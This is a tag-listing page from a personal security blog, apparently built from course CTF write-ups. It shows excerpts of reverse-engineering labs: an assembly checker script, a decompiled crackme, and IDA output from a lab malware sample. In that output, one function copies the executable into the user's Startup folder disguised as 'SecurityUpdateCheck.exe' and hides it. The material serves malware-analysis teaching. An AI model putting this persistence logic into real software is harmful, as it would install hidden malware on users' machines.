<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/eductf/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Eductf"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>Eductf | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/eductf/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/eductf/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Eductf</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/>Simple Reverse - 0x14(2023 Lab - AssemblyDev)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/reverse/>Reverse</a></div><p><h1 id=simple-reverse---0x142023-lab---assemblydev>Simple Reverse - 0x14(2023 Lab - AssemblyDev)
<a class=anchor href=#simple-reverse---0x142023-lab---assemblydev>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>Tools
<a href=https://carlosrafaelgn.com.br/Asm86/>Assembly x86 Emulator</a>
<a href=https://godbolt.org/>Compiler Explorer</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler arithmatic.py</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> module.checker <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> module.math <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> sys <span style=color:#f92672>import</span> argv
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>challenge_info <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>let a = MEM[RSP+0x0:RSP+0x4]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>let b = MEM[RSP+0x4:RSP+0x8]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>let c = MEM[RSP+0x8:RSP+0xc]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>EAX = a + b
</span></span></span><span style=display:flex><span><span style=color:#e6db74>EBX = a - b
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ECX = -c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>EDX = 9*a + 7
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a <span style=color:#f92672>=</span> get_rand(<span style=color:#ae81ff>4</span>)
</span></span><span style=display:flex><span>b <span style=color:#f92672>=</span> get_rand(<span style=color:#ae81ff>4</span>)
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> get_rand(<span style=color:#ae81ff>4</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>init_list <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    (RSP_DEFAULT <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x0</span>, a, <span style=color:#ae81ff>4</span>),
</span></span><span style=display:flex><span>    (RSP_DEFAULT <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x4</span>, b, <span style=color:#ae81ff>4</span>),
</span></span><span style=display:flex><span>    (RSP_DEFAULT <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>, c, <span style=color:#ae81ff>4</span>),
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>ans_list <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    (<span style=color:#e6db74>&#34;eax&#34;</span>, add(a, b, <span style=color:#ae81ff>4</span>)),
</span></span><span style=display:flex><span>    (<span style=color:#e6db74>&#34;ebx&#34;</span>, sub(a, b, <span style=color:#ae81ff>4</span>)),
</span></span><span style=display:flex><span>    (<span style=color:#e6db74>&#34;ecx&#34;</span>, neg(c, <span style=color:#ae81ff>4</span>)),
</span></span><span style=display:flex><span>    (<span style=color:#e6db74>&#34;edx&#34;</span>, add(mul(a, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>4</span>), <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>4</span>)),
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> len(argv) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>C<span style=color:#f92672>.</span>BLUE<span style=color:#e6db74>}</span><span style=color:#e6db74>[+]</span><span style=color:#e6db74>{</span>C<span style=color:#f92672>.</span>NC<span style=color:#e6db74>}</span><span style=color:#e6db74> Usage: python3 </span><span style=color:#e6db74>{</span>__file__<span style=color:#e6db74>}</span><span style=color:#e6db74> &lt;path_to_asm_file&gt;&#34;</span>)
</span></span><span style=display:flex><span>        print(challenge_info)
</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    code <span style=color:#f92672>=</span> open(argv[<span style=color:#ae81ff>1</span>], <span style=color:#e6db74>&#39;r&#39;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>    Checker(init_list, ans_list, code)
</span></span></code></pre></div><p>:::
:::spoiler data_movement.py</p><a href=/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/>Simple Reverse - 0x15(2023 HW - crackme_vectorization)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/reverse/>Reverse</a></div><p><h1 id=simple-reverse---0x152023-hw---crackme_vectorization>Simple Reverse - 0x15(2023 HW - crackme_vectorization)
<a class=anchor href=#simple-reverse---0x152023-hw---crackme_vectorization>#</a></h1><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler IDA Main Function</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> a1, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>a2, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>a3)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#75715e>// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&#34;+&#34; TO EXPAND]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  __isoc99_scanf(<span style=color:#e6db74>&#34;%d&#34;</span>, <span style=color:#f92672>&amp;</span>user_input_len);        <span style=color:#75715e>// 長度為49
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  user_input_len_cp <span style=color:#f92672>=</span> user_input_len;
</span></span><span style=display:flex><span>  sqrt_length <span style=color:#f92672>=</span> sqrt((<span style=color:#66d9ef>double</span>)user_input_len);   <span style=color:#75715e>// 開根號後是7
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  sqrt_length_cp <span style=color:#f92672>=</span> (<span style=color:#66d9ef>int</span>)sqrt_length;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( sqrt_length <span style=color:#f92672>&gt;</span> (<span style=color:#66d9ef>double</span>)(<span style=color:#66d9ef>int</span>)sqrt_length )
</span></span><span style=display:flex><span>    <span style=color:#f92672>++</span>sqrt_length_cp;
</span></span><span style=display:flex><span>  sqrt_len <span style=color:#f92672>=</span> _mm_shuffle_epi32(_mm_cvtsi32_si128(sqrt_length_cp), <span style=color:#ae81ff>224</span>).m128i_u64[<span style=color:#ae81ff>0</span>];<span style=color:#75715e>// 原本的shuffle num就是user input length的開根號結果
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  space <span style=color:#f92672>=</span> (struc_1 <span style=color:#f92672>*</span>)malloc(<span style=color:#ae81ff>0x10uLL</span>);
</span></span><span style=display:flex><span>  space<span style=color:#f92672>-&gt;</span>sqrt_len <span style=color:#f92672>=</span> sqrt_len;
</span></span><span style=display:flex><span>  size <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> sqrt_length_cp <span style=color:#f92672>*</span> (<span style=color:#66d9ef>__int64</span>)sqrt_length_cp;<span style=color:#75715e>// size是196
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  shuffle_space <span style=color:#f92672>=</span> malloc(size);
</span></span><span style=display:flex><span>  space<span style=color:#f92672>-&gt;</span>content_space <span style=color:#f92672>=</span> (<span style=color:#66d9ef>__int64</span>)shuffle_space;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( user_input_len_cp <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    shuffle_space_cp <span style=color:#f92672>=</span> shuffle_space;
</span></span><span style=display:flex><span>    len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0LL</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      __isoc99_scanf(<span style=color:#e6db74>&#34;%d&#34;</span>, content);
</span></span><span style=display:flex><span>      shuffle_space_cp[len<span style=color:#f92672>++</span>] <span style=color:#f92672>=</span> content[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> ( user_input_len <span style=color:#f92672>&gt;</span> (<span style=color:#66d9ef>int</span>)len );        <span style=color:#75715e>// 要輸入東西49次
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( length <span style=color:#f92672>==</span> sqrt_length_cp
</span></span><span style=display:flex><span>    <span style=color:#f92672>&amp;&amp;</span> (space_1 <span style=color:#f92672>=</span> (struc_1 <span style=color:#f92672>*</span>)malloc(<span style=color:#ae81ff>0x10uLL</span>),
</span></span><span style=display:flex><span>        space_1<span style=color:#f92672>-&gt;</span>sqrt_len <span style=color:#f92672>=</span> sqrt_len,
</span></span><span style=display:flex><span>        shuffle_space_1 <span style=color:#f92672>=</span> malloc(size),
</span></span><span style=display:flex><span>        src <span style=color:#f92672>=</span> cipher_flag,
</span></span><span style=display:flex><span>        space_1<span style=color:#f92672>-&gt;</span>content_space <span style=color:#f92672>=</span> (<span style=color:#66d9ef>__int64</span>)shuffle_space_1,
</span></span><span style=display:flex><span>        memcpy(shuffle_space_1, src, size),
</span></span><span style=display:flex><span>        result <span style=color:#f92672>=</span> ugly_matrix_multiplication(
</span></span><span style=display:flex><span>                   (<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)space_1,
</span></span><span style=display:flex><span>                   (<span style=color:#66d9ef>__int64</span>)space),             <span style=color:#75715e>// guess_cipher的大小是196
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                                                <span style=color:#75715e>// 他會把我們輸入的東西和他原本的東西一起送到guess_encrypt的這個function中
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#f92672>!</span>memcmp((<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)result[<span style=color:#ae81ff>1</span>], verify_key, size)) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;Correct!&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;:(&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0LL</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::
:::spoiler IDA Ugly Function</p><a href=/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/>Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/reverse/>Reverse</a></div><p><h1 id=simple-reverse---0x162023-lab---winmalware---sub_140001c80>Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)
<a class=anchor href=#simple-reverse---0x162023-lab---winmalware---sub_140001c80>#</a></h1><h2 id=description>Description
<a class=anchor href=#description>#</a></h2><blockquote><p>分析 eductf-lab.exe 中的 function sub_140001C80 在做什麼，並找出其行為所對應的 MITRE ATT&amp;CK technique ID。
Flag format: FLAG{T1234.001}</p></blockquote><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea>GetModuleFileNameA</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-getusernamea>GetUserNameA</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-copyfilea>CopyFileA</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfileattributesa>SetFileAttributesA</a></li></ul><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><ul><li>Main Function<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#66d9ef>__cdecl</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  Sleep(<span style=color:#ae81ff>0x1B7740u</span>);
</span></span><span style=display:flex><span>  sub_140001C80();
</span></span><span style=display:flex><span>  sub_140001030();
</span></span><span style=display:flex><span>  sub_140001120();
</span></span><span style=display:flex><span>  sub_140001BF0();
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li>sub_140001C80
:::spoiler IDA Source Code<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>DWORD <span style=color:#a6e22e>sub_140001C80</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  DWORD result; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  size_t v1; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD v2; <span style=color:#75715e>// [rsp+20h] [rbp-258h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> CHAR <span style=color:#f92672>*</span>lpNewFileName; <span style=color:#75715e>// [rsp+28h] [rbp-250h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD pcbBuffer[<span style=color:#ae81ff>4</span>]; <span style=color:#75715e>// [rsp+30h] [rbp-248h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  CHAR Buffer[<span style=color:#ae81ff>272</span>]; <span style=color:#75715e>// [rsp+40h] [rbp-238h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  CHAR Filename[<span style=color:#ae81ff>272</span>]; <span style=color:#75715e>// [rsp+150h] [rbp-128h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  result <span style=color:#f92672>=</span> GetModuleFileNameA(<span style=color:#ae81ff>0</span>i64, Filename, <span style=color:#ae81ff>0x104u</span>);
</span></span><span style=display:flex><span>  v2 <span style=color:#f92672>=</span> result;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( result )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> GetUserNameA(Buffer, pcbBuffer);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( result )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v1 <span style=color:#f92672>=</span> pcbBuffer[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>+</span> v2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>100</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( __CFADD__(pcbBuffer[<span style=color:#ae81ff>0</span>], v2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>100</span>) )
</span></span><span style=display:flex><span>        v1 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>i64;
</span></span><span style=display:flex><span>      lpNewFileName <span style=color:#f92672>=</span> (<span style=color:#66d9ef>const</span> CHAR <span style=color:#f92672>*</span>)malloc(v1);
</span></span><span style=display:flex><span>      sub_140001350(
</span></span><span style=display:flex><span>        lpNewFileName,
</span></span><span style=display:flex><span>        v2 <span style=color:#f92672>+</span> pcbBuffer[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>+</span> <span style=color:#ae81ff>100</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Users</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>AppData</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Roaming</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Microsoft</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Start Menu</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Programs</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Startup</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>SecurityUpdateCheck.exe&#34;</span>,
</span></span><span style=display:flex><span>        Buffer);
</span></span><span style=display:flex><span>      result <span style=color:#f92672>=</span> CopyFileA(Filename, lpNewFileName, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( result )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> SetFileAttributesA(lpNewFileName, <span style=color:#ae81ff>0x26u</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> result;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>:::</li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>:::spoiler IDA sub_14001C80(解析版)</p><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/>Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/reverse/>Reverse</a></div><p><h1 id=simple-reverse---0x172023-lab---winmalware---sub_140001030>Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)
<a class=anchor href=#simple-reverse---0x172023-lab---winmalware---sub_140001030>#</a></h1><h2 id=description>Description
<a class=anchor href=#description>#</a></h2><blockquote><p>分析 eductf-lab.exe 中的 function sub_140001030 在做什麼，並找出其行為所對應的 MITRE ATT&amp;CK technique ID。
Flag format: FLAG{T1234}</p></blockquote><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/timezoneapi/nf-timezoneapi-systemtimetofiletime>SystemTimeToFileTime</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-createwaitabletimerw>CreateWaitableTimerW</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-setwaitabletimer>SetWaitableTimer</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject>WaitForSingleObject</a></li></ul><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><ul><li>sub_140001030
